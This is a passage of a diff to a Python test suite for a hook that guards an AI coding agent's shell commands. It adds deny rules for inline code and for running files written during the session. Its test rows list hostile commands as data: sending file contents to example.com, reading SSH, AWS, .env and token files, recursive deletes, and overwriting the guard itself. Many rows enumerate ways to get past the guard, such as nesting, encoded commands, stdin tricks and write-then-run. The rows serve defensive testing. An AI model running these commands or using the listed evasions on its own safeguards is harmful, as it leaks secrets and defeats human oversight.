@@ -9,6 +9,7 @@ used for the auditor's `!allow` rows where either outcome is safe.
 """
 import base64
 import contextlib
+import datetime
 import importlib.util
 import io
 import json
@@ -107,7 +108,7 @@ CASES = [
     ('powershell -NoProfile -Command "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version"', 'allow'),
     ("pwsh -NoProfile -Command '(Get-CimInstance Win32_Processor | Measure-Object -Sum NumberOfEnabledLogicalProcessors).Sum'", 'allow'),
     ('powershell -NoProfile -Command "[math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum/1GB,1)"', 'allow'),
-    ('powershell -NoProfile -Command "Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Free -ne $null} | Select-Object Name, @{N=\'FreeGB\';E={[math]::Round($_.Free/1GB,1)}}"', None),
+    ('powershell -NoProfile -Command "Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Free -ne $null} | Select-Object Name, @{N=\'FreeGB\';E={[math]::Round($_.Free/1GB,1)}}"', 'deny'),
     ('powershell -NoProfile -Command "Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 15 Name, @{n=\'MB\';e={[math]::Round(\\$_.WorkingSet64/1MB)}} | Format-Table -AutoSize"', 'allow'),
     ("pwsh -NoProfile -Command 'Get-Volume | Where-Object { $_.DriveType -eq \"Fixed\" } | Select-Object DriveLetter'", 'allow'),
     (WSL_SSH.format('uptime; docker ps | wc -l'), 'deny'),   # 2026-10-30: the hook denies what the settings deny
@@ -118,7 +119,7 @@ CASES = [
     # (d) passthrough -> no decision
     ('mkdir -p out && echo hi > out/x.txt', None),
     ('npm install', None),
-    ('python -c "print(1)"', None),
+    ('python -c "print(1)"', 'deny'),
     ('curl -s https://example.com', None),
     ('curl -s -X POST http://127.0.0.1:8080/slots', None),
     ('powershell -NoProfile -Command "$env:PATH = \'x\'"', None),
@@ -130,8 +131,8 @@ CASES = [
     ('find . -name "*.tmp" -delete', None),
     ('ssh ' + REMOTE, 'deny'),   # 2026-10-30: the hook denies what the settings deny
     ('for d in /z/repos/*/; do echo $d; done', None),
-    ('node -e "1"', None),
-    ("pwsh -NoProfile -Command 'Get-ChildItem C:/tmp/x | ForEach-Object { $_.Delete() }'", None),
+    ('node -e "1"', 'deny'),
+    ("pwsh -NoProfile -Command 'Get-ChildItem C:/tmp/x | ForEach-Object { $_.Delete() }'", 'deny'),
     ("pwsh -NoProfile -Command '(Get-Process -Id 4242).Kill()'", None),
     ('curl -s --json \'{"a":1}\' http://127.0.0.1:8080/x', None),
     ('ssh ' + REMOTE + " 'sqlite3 /srv/app/data.db \"select 1\"'", 'deny'),   # 2026-10-30: the hook denies what the settings deny
@@ -341,7 +342,7 @@ CASES = [
     (PS + '"pushd C:/Users/x/.ssh; copy a authorized_keys"', 'deny'),
     (PS + '"chdir C:/ProgramData; Out-File x.txt"', 'deny'),
     (PS + '"Set-Location -Path C:/Windows; New-Item x.txt"', 'deny'),
-    (PS + '"Set-Location C:/tmp; Set-Content a.txt x"', None),
+    (PS + '"Set-Location C:/tmp; Set-Content a.txt x"', 'deny'),   # S-B4: two statements
     (PS + '"Set-Location C:/Users/x/.claude; Get-ChildItem"', 'deny'),   # audit A2: credential dir / env dump / network substitution
     ('pushd ~/.claude && cp /tmp/a settings.json', 'deny'),
     # W5 process substitution
@@ -675,13 +676,14 @@ PAYLOAD_CASES = [
     ("python -c \"print(open('C:/Users/x/.cache/huggingface/token').read())\"", 'deny'),
     ('echo x > scripts/hooks/lis-guard.py', 'deny'),
     ('cp evil.py scripts/hooks/lis-guard.py', 'deny'),
-    # payloads the scan does not match keep today's outcome (no decision)
-    ('python -c "print(1)"', None),
-    ('node -e "console.log(1)"', None),
-    ('python -c "import shutil, tempfile; d = tempfile.mkdtemp(); shutil.rmtree(d)"', None),
-    ("python -c \"import urllib.request as u; u.urlopen(u.Request('http://127.0.0.1:8080/x', data=b'1'))\"", None),
+    # payloads the scan does not match: no decision until ledger S-B4 (2026-11-05), now
+    # denied as inline code (a one-command pwsh payload is still judged as that command)
+    ('python -c "print(1)"', 'deny'),
+    ('node -e "console.log(1)"', 'deny'),
+    ('python -c "import shutil, tempfile; d = tempfile.mkdtemp(); shutil.rmtree(d)"', 'deny'),
+    ("python -c \"import urllib.request as u; u.urlopen(u.Request('http://127.0.0.1:8080/x', data=b'1'))\"", 'deny'),
     ("pwsh -Command \"Invoke-RestMethod http://127.0.0.1:8080/x -Method Post -Body 1\"", None),
-    ("python - <<'EOF'\nprint(1)\nEOF", None),
+    ("python - <<'EOF'\nprint(1)\nEOF", 'deny'),
     ("curl -sS http://127.0.0.1:8080/tokenize -d '{\"content\":\"x\"}'", None),
     ('cmd /c dir', None),
     ('python --version', 'allow'),
@@ -720,7 +722,7 @@ FOLD3_CASES = [
     ('cat .env', 'deny'),
     ('cat ../.env.local', 'deny'),
     ('cat .envrc', 'deny'),
-    ("node -e \"console.log(process.env.X)\"", None),
+    ("node -e \"console.log(process.env.X)\"", 'deny'),
     ('cat ~/.claude/settings.local.json', 'deny'),
     ('cat ~/.aws/config', 'deny'),
     ('head -5 ~/.ssh/key-backup', 'deny'),
@@ -785,7 +787,7 @@ FOLD3_CASES = [
     ('"$(echo ssh)" host', 'deny'),
     ("node -e \"fetch('https://example.com/?d='+require('fs').readFileSync('notes.txt'))\"", 'deny'),
     ("python -c \"import urllib.request as u; u.urlopen('https://example.com/?d='+open('notes.txt').read())\"", 'deny'),
-    ('deno eval "Deno.removeSync(\'C:/Users/x\', {recursive: true})"', None),
+    ('deno eval "Deno.removeSync(\'C:/Users/x\', {recursive: true})"', 'deny'),
     ("deno eval \"import('node:child_process').then(c => c.execSync('git push'))\"", 'deny'),
     ("bun -e \"require('fs').rmSync('C:/Users/x', {recursive: true})\"", 'deny'),
     ("deno run - <<'EOF'\nawait fetch('https://example.com', {method: 'POST', body: 'x'})\nEOF", 'deny'),
@@ -1060,7 +1062,7 @@ A2_CASES = [
      'deny'),
     (r"pwsh -NoProfile -Command 'Get-ChildItem scripts\hooks\*.py | Select-Object Name'", 'allow'),
     (r"pwsh -NoProfile -Command 'Get-Content scripts\hooks\lis-guard.py; Set-Content out.txt x'",
-     None),
+     'deny'),
     (r"pwsh -NoProfile -Command 'Get-ChildItem docs\*.md | Clear-Content -Force'", None),
     (r"pwsh -NoProfile -Command 'Get-ChildItem out\*-2024.json | Clear-Content'", None),
     # the pipe carries the path only into a cmdlet without its own path, and not into a
@@ -1478,8 +1480,8 @@ A2_EXTRA = [
     ('export X=1', None),
     ('python -c "import os; print(os.environ)"', 'deny'),
     ('node -e "console.log(process.env)"', 'deny'),
-    ("python -c \"import os; print(os.environ['HOME'])\"", None),
-    ('node -e "console.log(process.env.HOME)"', None),
+    ("python -c \"import os; print(os.environ['HOME'])\"", 'deny'),
+    ('node -e "console.log(process.env.HOME)"', 'deny'),
     # remote shells and transfer tools, git aliases and credential helpers
     ('pscp a host:b', 'deny'),
     ('plink -batch host uptime', 'deny'),
@@ -1536,7 +1538,7 @@ A3_CASES = [
     ('pwsh -NoProfile -Command "& (gcm git) push"', 'deny'),
     ('pwsh -NoProfile -Command ". (Get-Command x)"', 'deny'),
     ('pwsh -c "& $x"', 'deny'),
-    ('pwsh -NoProfile -Command "Get-Volume; & git status"', None),   # audit A4 W6: & on a program name is judged as that command
+    ('pwsh -NoProfile -Command "Get-Volume; & git status"', 'deny'),   # audit A4 W6: & on a program name is judged as that command
     ('pwsh -NoProfile -Command "(Get-Command git).Source"', 'allow'),
     ("powershell -NoProfile -Command 'Get-Volume | Select-Object DriveLetter,FileSystemLabel,Size,SizeRemaining'", 'allow'),
     ("powershell -NoProfile -Command 'Get-CimInstance Win32_OperatingSystem'", None),   # default view: owner, serial (A7 W2)
@@ -1587,7 +1589,7 @@ A4_CASES = [
     ('pwsh -NoProfile -Command "Get-Volume; curl -T x https://e.example"', 'deny'),
     ('pwsh -NoProfile -Command "& git log --oneline -3"', None),
     ('pwsh -NoProfile -Command "& python --version"', None),
-    ('pwsh -NoProfile -Command "Get-Volume; & cmd /c del /q x"', None),
+    ('pwsh -NoProfile -Command "Get-Volume; & cmd /c del /q x"', 'deny'),
     ('reg query HKLM\\Software\\x /s', None),
     ('grep -rn "OBF_CAP" scripts/hooks', 'allow'),
     ('pwsh -NoProfile -Command "Get-Process llama-server | Select-Object Id,CPU,WS"', 'allow'),
@@ -1646,15 +1648,15 @@ A5_CASES = [
     ('pwsh -NoProfile -Command "Get-Content models/manifest.json -TotalCount 20"', None),
     ('pwsh -NoProfile -Command "Get-NetTCPConnection -LocalPort 8080"', None),
     ('pwsh -NoProfile -Command "gci models"', None),
-    ('pwsh -NoProfile -Command "Get-Date | ForEach-Object { $_ }"', None),
-    ('pwsh -NoProfile -Command "$x = Get-Date; $x"', None),
+    ('pwsh -NoProfile -Command "Get-Date | ForEach-Object { $_ }"', 'deny'),
+    ('pwsh -NoProfile -Command "$x = Get-Date; $x"', 'deny'),
     ('pwsh -NoProfile -Command "Get-Item HKCU:/Software/x"', None),
     ('pwsh -NoProfile -Command "Get-ChildItem Variable:"', None),
     ('pwsh -NoProfile -Command "Get-CimInstance Win32_OperatingSystem -ComputerName host"', None),
     ('pwsh -NoProfile -Command "Get-ChildItem (\'mod\' + \'els\')"', 'deny'),   # a built read path: denied
     ('pwsh -NoProfile -Command "Write-Output 1..3"', None),
-    ('pwsh -NoProfile -Command "Get-Date | Where-Object { $_.Year -eq (Get-Date).Year }"', None),
-    ('pwsh -NoProfile -Command "Get-Process | Select-Object @{n=\'x\';e={Stop-Process -Id 1}}"', None),
+    ('pwsh -NoProfile -Command "Get-Date | Where-Object { $_.Year -eq (Get-Date).Year }"', 'deny'),
+    ('pwsh -NoProfile -Command "Get-Process | Select-Object @{n=\'x\';e={Stop-Process -Id 1}}"', 'deny'),
     ('pwsh -NoProfile -Command "Get-Date -f yyyy"', None),
 ]
 CASES += A5_CASES
@@ -1798,7 +1800,7 @@ A6_CASES = [(x, 'allow' if x == 'pwsh -NoProfile -c Get-Date' else NOTALLOW)
     # secret-bearing properties: a command line, a service binary path, a script's text
     ('pwsh -NoProfile -Command "Get-Process | Select-Object Name,CommandLine"', None),
     ('pwsh -NoProfile -Command "(Get-Process llama-server).CommandLine"', None),
-    ("pwsh -NoProfile -Command 'Get-Process | Where-Object { $_.CommandLine -like \"*key*\" }'", None),
+    ("pwsh -NoProfile -Command 'Get-Process | Where-Object { $_.CommandLine -like \"*key*\" }'", 'deny'),
     ('pwsh -NoProfile -Command "Get-Process | ConvertTo-Json"', None),
     ('pwsh -NoProfile -Command "Get-Process llama-server | Format-List"', None),
     ('pwsh -NoProfile -Command "Get-Service | Select-Object Name,BinaryPathName"', None),
@@ -1881,7 +1883,7 @@ A7_CASES = [(x, NOTALLOW) for x in A7_AUDIT_ROWS.strip().split('\n')] + [
     # every property named must be on the producer's list; the list is scalars only
     (P7 + '"Get-Process | Sort-Object CommandLine"', None),
     (P7 + '"Get-Process | Measure-Object -Property Parent"', None),
-    (P7 + "'Get-Process | Where-Object { $_.UserName -eq \"x\" }'", None),
+    (P7 + "'Get-Process | Where-Object { $_.UserName -eq \"x\" }'", 'deny'),   # S-B4: script block
     (P7 + '"Get-CimInstance Win32_BIOS | Select-Object SerialNumber"', None),
     (P7 + '"Get-CimInstance Win32_BIOS | Select-Object Manufacturer,SMBIOSBIOSVersion"', 'allow'),
     (P7 + '"Get-CimInstance Win32_OperatingSystem | Select-Object RegisteredUser"', None),
@@ -1933,6 +1935,138 @@ A8_CASES = [
     ('pwsh -wd . -NoProfile -Command "Get-ChildItem"', None),   # -Command takes no other options
 ]
 CASES += A8_CASES
+
+# Ledger S-B4 rule 1 (2026-11-05): inline code is denied with INLINE_REASON, clean code too;
+# a payload the scan denies keeps the scan's reason (checked in main). Run with
+# LIS_SESSION_START unset (main pops it), so rule 2 plays no part in these rows.
+SB4_INLINE = [
+    ('python -c "print(1)"', 'deny'),
+    ('python3 -Ic "print(1)"', 'deny'),
+    ('py -3 -c "print(1)"', 'deny'),
+    ('python -c"print(1)"', 'deny'),
+    ('C:/Python313/python.exe -c "print(1)"', 'deny'),
+    ('node -e "console.log(1)"', 'deny'),
+    ('node --eval "console.log(1)"', 'deny'),
+    ('node -p "1 + 1"', 'deny'),
+    ('node --print=1', 'deny'),
+    ('deno eval "console.log(1)"', 'deny'),
+    ('bun -e "console.log(1)"', 'deny'),
+    ("perl -e 'print 1'", 'deny'),
+    ("perl -ne 'print' notes.txt", 'deny'),
+    ("ruby -e 'puts 1'", 'deny'),
+    ('pwsh -NoProfile -Command "npm test; npm run build"', 'deny'),
+    ('pwsh -NoProfile -Command "Get-Date; Get-Date"', 'allow'),   # read-only grammar: judged
+    ('pwsh -c "Get-ChildItem | ForEach-Object { $_.Name }"', 'deny'),
+    ('powershell -NoProfile -Command "$d = Get-Date; $d"', 'deny'),
+    ('pwsh -NoProfile -Command "Write-Output @(1, 2)"', 'deny'),
+    ('pwsh -NoProfile -EncodedCommand RwBlAHQALQBEAGEAdABlAA==', 'deny'),
+    ('pwsh -NoProfile -ec RwBlAHQALQBEAGEAdABlAA==', 'deny'),
+    ('pwsh -NoProfile -Command -', 'deny'),
+    ("bash -c 'npm test; npm run build'", 'deny'),
+    ("sh -c 'git add notes.txt && git commit -m x'", 'deny'),
+    ("bash -lc 'for f in a b; do echo $f; done'", 'deny'),
+    ("bash -c 'echo $(git status)'", 'deny'),
+    ("zsh -c 'npm test\nnpm run build'", 'deny'),
+    # stdin: a heredoc, a here-string, a pipe, - or /dev/stdin, a process substitution
+    ("python - <<'EOF'\nprint(1)\nEOF", 'deny'),
+    ("python <<'EOF'\nprint(1)\nEOF", 'deny'),
+    ("node <<EOF\nconsole.log(1)\nEOF", 'deny'),
+    ("bash <<'EOF'\nls\nEOF", 'deny'),
+    ('python3 <<< "print(1)"', 'deny'),
+    ("echo 'print(1)' | python", 'deny'),
+    ('cat notes.txt | python -', 'deny'),
+    ('cat notes.txt | python -I -', 'deny'),
+    ('echo ls | bash', 'deny'),
+    ('echo ls | sh -s', 'deny'),
+    ("echo 'console.log(1)' | node", 'deny'),
+    ("echo 'print 1' | perl", 'deny'),
+    ('echo Get-Date | pwsh -NoProfile -Command -', 'deny'),
+    ('echo Get-Date | pwsh -NoProfile', 'deny'),
+    ('echo dir | cmd', 'deny'),
+    ("echo 'print(1)' | python 2>&1", 'deny'),
+    ("echo 'print(1)' | timeout 5 python", 'deny'),
+    ('python /dev/stdin', 'deny'),
+    ("bash <(echo ls)", 'deny'),
+    # wrappers and nesting: the inner command is judged
+    ('timeout 60 python -c "print(1)"', 'deny'),
+    ('env PYTHONUTF8=1 node -e "console.log(1)"', 'deny'),
+    ('nohup python -c "print(1)"', 'deny'),
+    ('bash -c "python -c \'print(1)\'"', 'deny'),
+    ('cmd /c python -c "print(1)"', 'deny'),
+    ('wsl python3 -c "print(1)"', 'deny'),
+    ('pwsh -NoProfile -Command "python -c \'print(1)\'"', 'deny'),
+    ('pwsh -NoProfile -Command "& python -c \'print(1)\'"', 'deny'),
+    ('pwsh -NoProfile -Command "Get-Content notes.txt | python"', 'deny'),
+    ("ls && python -c 'print(1)'", 'deny'),
+    # grouping and compound forms (S-B4 audit C2): the command inside is judged
+    ('(python -c 1)', 'deny'),
+    ('{ node -e 1; }', 'deny'),
+    ('if true; then python -c 1; fi', 'deny'),
+    ('if false; then :; elif true; then python -c 1; fi', 'deny'),
+    ('if false; then :; else node -e 1; fi', 'deny'),
+    ('while true; do python -c 1; done', 'deny'),
+    ('until false; do perl -e 1; done', 'deny'),
+    ('for f in a b; do python -c 1; done', 'deny'),
+    ('! python -c 1', 'deny'),
+    ('((python -c 1))', 'deny'),
+    ('echo `python -c 1`', 'deny'),
+    ('echo "`node -e 1`"', 'deny'),
+    ('x=`python -c 1`', 'deny'),
+    ('echo $(echo `python -c 1`)', 'deny'),
+    ('cat notes.txt | (python)', 'deny'),
+    ('cat notes.txt | { python; }', 'deny'),
+    ('(cat notes.txt | python)', 'deny'),
+    ('echo `cat notes.txt | python`', 'deny'),
+    ('echo `python -c 1; echo x`', 'deny'),
+    ("x=$(python3 <<< 'print(1)')", 'deny'),
+    ("(python <<< 'print(1)')", 'deny'),
+    ("if true; then node <<< 'console.log(1)'; fi", 'deny'),
+    ("bash -c -- 'python -c 1; echo x'", 'deny'),
+    ("bash -c -- 'python -c 1'", 'deny'),
+    ("bash -c -e 'python -c 1'", 'deny'),
+    ("bash -c -o pipefail 'node -e 1'", 'deny'),
+    ("bash -c '(git status)'", 'deny'),
+    ('bash -c "cat notes.txt | (python)"', 'deny'),
+    # php -r, lua -e, Rscript -e (S-B4 audit W1)
+    ("php -r 'echo 1;'", 'deny'),
+    ("php -d display_errors=1 -r 'echo 1;'", 'deny'),
+    ("php -B 'echo 1;' -R 'echo 1;'", 'deny'),
+    ("lua -e 'print(1)'", 'deny'),
+    ("lua -l m -e 'print(1)'", 'deny'),
+    ("Rscript -e 'print(1)'", 'deny'),
+    ("Rscript.exe --vanilla -e 'print(1)'", 'deny'),
+    ("ruby -I lib -e 'puts 1'", 'deny'),
+    ("ruby -I -e 'puts 1'", 'deny'),
+    # kept: one command, the read-only grammar, a script or module run, text that names a form
+    ('pwsh -NoProfile -Command "Get-Process | Select-Object Name"', 'allow'),
+    ('pwsh -NoProfile -Command "& git status"', None),
+    ('pwsh -NoProfile -Command "git log --oneline"', None),
+    ('pwsh -NoProfile -Command "Get-FileHash notes.txt"', None),
+    ("bash -c 'git status'", 'allow'),
+    ("bash -c 'ls | head -5'", 'allow'),
+    ("bash -c 'npm test'", None),
+    ("sh -c 'node --test bench/loop/fixture/test/text.test.js'", None),
+    ('python --version', 'allow'),
+    ('node -v', 'allow'),
+    ('python -m json.tool notes.json', None),
+    ('cat notes.json | python -m json.tool', None),
+    ('echo x | python -V', 'allow'),
+    ('node --test bench/loop/fixture/test/text.test.js', None),
+    ('timeout 120 node --test bench/loop/fixture/test/text.test.js', None),
+    ('git log --oneline | head -5', 'allow'),
+    ('echo "python -c x"', 'allow'),
+    ("cat <<'EOF' > notes.txt\npython -c 'print(1)'\nEOF", None),
+    ("git commit -F - <<'EOF'\nnode -e usage fixed\nEOF", None),
+    ('command -v python', None),
+    ('perl -v', None),
+    ('php -v', None),
+    ('lua -v', None),
+    ('Rscript --version', None),
+    ("echo 'a `python -c 1` b'", None),        # single quotes: no substitution
+    ("git log --format='`%h`' -1", None),
+    ('npm test 2>&1 | tail -20', None),
+]
+CASES += SB4_INLINE
 
 
 def write(dirpath, name, body, nl='\n', enc='utf-8'):
@@ -2028,7 +2162,286 @@ def repo_root(path):
         g.REPO_ROOT = old
 
 
+@contextlib.contextmanager
+def session_at(t):
+    """LIS_SESSION_START = epoch t (None: unset) for the block, then unset again."""
+    if t is None:
+        os.environ.pop(g.SESSION_START_ENV, None)
+    else:
+        os.environ[g.SESSION_START_ENV] = datetime.datetime.fromtimestamp(
+            t, datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%fZ')
+    try:
+        yield
+    finally:
+        os.environ.pop(g.SESSION_START_ENV, None)
+
+
+def born(path):
+    st = os.stat(path)
+    return getattr(st, 'st_birthtime', st.st_ctime)
+
+
+def sb4_write_run():
+    """Ledger S-B4 rule 2: a run of a file created or modified after LIS_SESSION_START
+    denies (an in-place edit keeps the birthtime; its mtime counts, W2); a file untouched
+    since before, an unset or malformed env and the ladder fixtures' test commands do not.
+    Returns (checks, fails)."""
+    n = fails = 0
+
+    def expect(name, ok):
+        nonlocal n, fails
+        n += 1
+        if not ok:
+            fails += 1
+            print(f'FAIL S-B4 rule 2: {name}')
+
+    # the launcher's shapes: PowerShell round-trip 'o' (7 digits) and whole seconds
+    for text, want in [('2026-11-05T07:37:44.1234567Z', 1793864264.1234567),
+                       ('2026-11-05T07:37:44Z', 1793864264.0)]:
+        os.environ[g.SESSION_START_ENV] = text
+        got = g.session_start()
+        expect(f'session_start({text!r}) = {got!r}', got is not None and abs(got - want) < 1e-6)
+    for text, ok in [('2026-11-05T10:00:00Z', True), ('2026-11-05T10:00:00.1234567Z', True),
+                     ('2026-11-05T10:00:00.123456789+00:00', True), ('2026-11-05T10:00:00', False),
+                     ('2026-11-05T10:00:00-05:00', False), ('yesterday', False), ('', False),
+                     ('2026-13-05T10:00:00Z', False)]:
+        os.environ[g.SESSION_START_ENV] = text
+        expect(f'session_start({text!r})', (g.session_start() is not None) == ok)
+    os.environ.pop(g.SESSION_START_ENV, None)
+    expect('session_start unset', g.session_start() is None)
+    os.environ[g.SESSION_START_ENV] = '2026-11-05T10:00:00.5Z'
+    expect('session_start value', g.session_start() == 1793872800.5)
+    os.environ.pop(g.SESSION_START_ENV, None)
+
+    exts = ('py', 'js', 'sh', 'ps1', 'rb', 'pl', 'mjs')
+    with tempfile.TemporaryDirectory() as t:
+        for e in exts:
+            write(t, 'old.' + e, '1\n')
+        write(t, 'old_e.py', '1\n')
+        write(t, 'old_k.py', '1\n')       # never touched after the start
+        time.sleep(0.05)
+        start = time.time()
+        time.sleep(0.05)
+        for e in exts:
+            write(t, 'new.' + e, '1\n')
+        write(t, 'new_ro.sh', 'ls\n')       # read-only content: allowed before S-B4
+        write(t, 'edited.tmp', '2\n')      # an Edit-tool style rewrite of old_e.py
+        os.replace(os.path.join(t, 'edited.tmp'), os.path.join(t, 'old_e.py'))
+        os.makedirs(os.path.join(t, 'sub'))
+        write(t, 'sub/mod.py', '1\n')
+        with open(os.path.join(t, 'old.py'), 'r+', encoding='utf-8') as f:
+            f.write('2\n')                  # in place: the birthtime stays
+        pre = all(born(os.path.join(t, 'old.' + e)) < start < born(os.path.join(t, 'new.' + e))
+                  for e in exts)
+        expect('fixture birthtimes straddle the start', pre)
+        fx = t.replace('\\', '/')
+        deny = ['python -I new.py', 'python new.py', 'py -3 new.py', 'node new.js', 'node new.mjs',
+                'bash new.sh', 'sh new.sh', 'source new.sh', '. new.sh', './new.sh',
+                'bash < new.sh',
+                'python -I < new.py', 'pwsh -NoProfile -File new.ps1', 'pwsh -File ./new.ps1',
+                'pwsh new.ps1', './new.ps1', '.\\new.ps1', 'powershell -File .\\new.ps1',
+                'pwsh -NoProfile -Command "& ./new.ps1"', 'pwsh -NoProfile -Command "./new.ps1"',
+                'ruby new.rb', 'perl new.pl', 'node --test new.js', 'node -r ./new.js old.js',
+                'node --import=./new.mjs old.js', 'timeout 60 python -I new.py',
+                'env PYTHONUTF8=1 python -I new.py', 'cd sub && python -I mod.py',
+                'pushd sub && python -I mod.py', 'git status && python -I new.py',
+                "bash -c 'python -I new.py'", 'python -I old_k.py; python -I new.py',
+                f'python -I {fx}/new.py', 'bash new_ro.sh', 'zsh new.sh', 'dash new.sh',
+                'ksh new.sh', '(python -I new.py)', '{ python -I new.py; }',
+                'if true; then python -I new.py; fi', 'echo `python -I new.py`',
+                'cat old.py | (python -I new.py)', 'while true; do bash new.sh; done',
+                "bash -c -- 'python -I new.py'"]
+        for cmd in ('python -I old.py', 'python old.py', 'cd sub && cd .. && python -I old.py'):
+            with session_at(start):             # written in place: the birthtime stays, the
+                d = g.decide(cmd, t)            # mtime is after the start (S-B4 W2)
+            expect(f'in-place write {cmd!r}: {d}', d and d[0] == 'deny'
+                   and 'old.py was created or modified' in d[1])
+        d = None
+        with session_at(start):                 # a pre-existing file rewritten by rename
+            d = g.decide('python -I old_e.py', t)
+        expect(f'Edit-style rewrite of a pre-existing file: {d}', d and d[0] == 'deny'
+               and 'old_e.py was created or modified' in d[1])
+        keep = [('python -I old_k.py', None), ('python old_k.py', None), ('node old.js', None),
+                ('bash old.sh', None), ('./old.sh', None), ('pwsh -NoProfile -File old.ps1', None),
+                ('.\\old.ps1', None), ('ruby old.rb', None), ('node --test old.js', None),
+                ('cat new.py', 'allow'), ('cd sub && cd .. && python -I old_k.py', None),
+                ('python -m new', None), ('(python -I old_k.py)', None),
+                ('if true; then python -I old_k.py; fi', None), ('zsh old.sh', None)]
+        with session_at(start):
+            for cmd in deny:
+                d = g.decide(cmd, t)
+                expect(f'deny {cmd!r}: {d}', d is not None and d[0] == 'deny'
+                       and 'modified in this session' in d[1]
+                       and re.search(r'(new|mod)\w*\.', d[1]))
+            for cmd, want in keep:
+                d = g.decide(cmd, t)
+                expect(f'keep {cmd!r}: {d}', (d[0] if d else None) == want)
+            d = g.decide('python -I new.py', None)  # no cwd: read under the process cwd
+            expect(f'no cwd: {d}', d and d[0] == 'deny' and 'does not exist' in d[1])
+            write(t, 'push.py', 'import os\nos.system("git push --force")\n')
+            d = g.decide('python -I push.py', t)    # a scan hit keeps the scan's reason
+            expect(f'scan reason kept: {d}', d and d[0] == 'deny' and 'in this session' not in d[1])
+        with session_at(start - 3600):              # every file is new: the old ones too
+            d = g.decide('python -I old.py', t)
+            expect(f'start before old.py: {d}', d and 'old.py was created or modified' in d[1])
+        with session_at(time.time() + 60):          # the start after every file: nothing new
+            d = g.decide('python -I new.py', t)
+            expect(f'start after new.py: {d}', d is None)
+        for env in (None, 'yesterday', '2026-11-05T10:00:00'):   # not judged, and said so
+            if env is None:
+                os.environ.pop(g.SESSION_START_ENV, None)
+            else:
+                os.environ[g.SESSION_START_ENV] = env
+            d = g.decide('python -I new.py', t)
+            expect(f'env {env!r}: no decision {d}', d is None and g._NOTE[0]
+                   and g.SESSION_START_ENV in g._NOTE[0])
+            old_in, old_err, old_out = sys.stdin, sys.stderr, sys.stdout
+            try:
+                sys.stdin = io.StringIO(json.dumps({'tool_name': 'Bash', 'cwd': t,
+                                                    'tool_input': {'command': 'node new.js'}}))
+                sys.stderr, sys.stdout = io.StringIO(), io.StringIO()
+                g.main()
+                err, out = sys.stderr.getvalue(), sys.stdout.getvalue()
+            finally:
+                sys.stdin, sys.stderr, sys.stdout = old_in, old_err, old_out
+            expect(f'env {env!r}: main says so {err!r} {out!r}',
+                   out == '' and 'write-then-run not judged' in err)
+            os.environ.pop(g.SESSION_START_ENV, None)
+        d = g.decide('npm test', t)                 # no run target: no note
+        expect(f'no note without a run: {g._NOTE[0]!r}', d is None and g._NOTE[0] is None)
+
+    # the ladder fixtures as bench/ladder/run.ps1 builds them (generated, then the session
+    # starts): every fixture test command gets no decision; a test file the session writes
+    # into the tree after the start is denied
+    sys.path.insert(0, os.path.normpath(os.path.join(HERE, '..', '..', '..', 'bench', 'ladder')))
+    try:
+        import gen_bait
+        import gen_longfix
+        import gen_stalefig
+    finally:
+        sys.path.pop(0)
+    root = os.path.normpath(os.path.join(HERE, '..', '..', '..'))
+    with tempfile.TemporaryDirectory() as t:
+        trees = {k: os.path.join(t, k) for k in ('longfix', 'stalefig', 'bait', 'm')}
+        for k in ('longfix', 'stalefig', 'bait', 'm'):
+            os.makedirs(trees[k])
+        gen_longfix.generate(trees['longfix'], os.path.join(trees['m'], 'l.json'))
+        gen_stalefig.generate(trees['stalefig'], os.path.join(trees['m'], 's.json'))
+        gen_bait.generate(trees['bait'], os.path.join(trees['m'], 'b.json'))
+        time.sleep(0.05)
+        start = time.time()
+        time.sleep(0.05)
+        rows = [('node --test --test-reporter=./longfix/reporter.mjs longfix/test/all.test.js',
+                 trees['longfix']),
+                ('node --test longfix/test/all.test.js', trees['longfix']),
+                ('node --test tallyctl/test/all.test.js', trees['stalefig']),
+                ('node --test longfix/test/all.test.js', trees['bait']),
+                ('node --test bench/loop/fixture/test/text.test.js', root)]
+        with session_at(start):
+            for cmd, cwd in rows:
+                d = g.decide(cmd, cwd)
+                expect(f'fixture command {cmd!r}: {d}', d is None)
+            write(trees['longfix'], 'longfix/test/extra.test.js', '1\n')
+            d = g.decide('node --test longfix/test/extra.test.js', trees['longfix'])
+            expect(f'session-written test file: {d}', d and d[0] == 'deny'
+                   and 'extra.test.js' in d[1])
+    return n, fails
+
+
+def sb4_fold2():
+    """S-B4 audit fold: a run target written earlier in the same command (C1) or not on
+    disk yet, a file recreated under an old name (NTFS tunneling keeps the birthtime, the
+    mtime is new: W2), and more runs than RUN_TARGET_CAP. Returns (checks, fails)."""
+    n = fails = 0
+
+    def expect(name, ok):
+        nonlocal n, fails
+        n += 1
+        if not ok:
+            fails += 1
+            print(f'FAIL S-B4 fold: {name}')
+
+    with tempfile.TemporaryDirectory() as t:
+        for name in ('old_k.py', 'old.sh', 'tun.py', 'ren.py', 'away.py', 'sub/x.py',
+                     'bin/tool.exe', 'old.ps1', 'y.py', 'sub/t.js', 'scripts/build.js'):
+            os.makedirs(os.path.dirname(os.path.join(t, name)), exist_ok=True)
+            write(t, name, '1\n')
+        time.sleep(0.05)
+        start = time.time()
+        time.sleep(0.05)
+        write(t, 'new.py', '1\n')
+        write(t, 'new.ps1', '1\n')
+        write(t, 'sub/y.py', '1\n')        # a new y.py under sub, an old one at the top
+        write(t, 'sub/nn.py', '1\n')
+        os.makedirs(os.path.join(t, 'lib'))
+        write(t, 'lib/index.js', '1\n')    # node lib/index and node lib load it
+        os.remove(os.path.join(t, 'tun.py'))            # delete, then recreate
+        write(t, 'tun.py', '2\n')
+        os.remove(os.path.join(t, 'ren.py'))            # delete, then rename into the name
+        write(t, 'ren.tmp', '2\n')
+        os.rename(os.path.join(t, 'ren.tmp'), os.path.join(t, 'ren.py'))
+        os.rename(os.path.join(t, 'away.py'), os.path.join(t, 'away.bak'))  # rename away,
+        write(t, 'away.tmp', '2\n')                                        # then rename a
+        os.rename(os.path.join(t, 'away.tmp'), os.path.join(t, 'away.py'))  # new file in
+        tunneled = [x for x in ('tun.py', 'ren.py', 'away.py') if born(os.path.join(t, x)) < start]
+        print(f'S-B4 W2: birthtime kept by tunneling on this volume: {tunneled or "none"}')
+        written = [
+            'cp new.py fresh.py && python fresh.py', 'cat new.py > f.py; python f.py',
